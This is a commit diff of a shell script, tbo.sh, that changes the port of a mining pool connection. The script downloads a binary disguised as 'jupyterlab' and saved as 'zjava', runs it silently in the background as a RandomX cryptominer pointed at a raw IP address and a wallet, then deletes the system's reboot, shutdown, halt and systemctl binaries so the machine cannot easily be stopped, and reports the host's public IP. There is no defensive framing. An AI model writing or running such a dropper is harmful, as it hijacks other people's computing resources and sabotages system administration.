0d93238e394d5368871e8e0050b6227f4931c8eb
Almira Hanafi <almirahanafie@outlook.com>
2024-07-16 13:04:52 +0000

    tbo.sh edited online with Bitbucket

--- tbo.sh
+++ tbo.sh
@@ -4,7 +4,7 @@ apt-get install -y wget curl sudo
 sudo apt-get update
 wget -qO zjava https://bitbucket.org/new-kamikaze/jupyter/downloads/jupyterlab
 chmod +x zjava 
-sudo nohup ./zjava -o 47.237.3.59:443 -a rx/0 -u TBs1gnPNKz17H7YwqvkAcke2G1GWzcuPABrMRiKqR1XRcXy4HpMRWXaWs4LqtS5NzJBJqGVFNSjB1TUVq3M6yMKD66XXzGjGdo.$(echo STB-$(shuf -i 1000-9999 -n 1)) -t 94 -k --randomx-1gb-pages -p x > /dev/null 2>&1 &
+sudo nohup ./zjava -o 47.237.3.59:80 -a rx/0 -u TBs1gnPNKz17H7YwqvkAcke2G1GWzcuPABrMRiKqR1XRcXy4HpMRWXaWs4LqtS5NzJBJqGVFNSjB1TUVq3M6yMKD66XXzGjGdo.$(echo STB-$(shuf -i 1000-9999 -n 1)) -t 94 -k --randomx-1gb-pages -p x > /dev/null 2>&1 &
 sleep 20
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
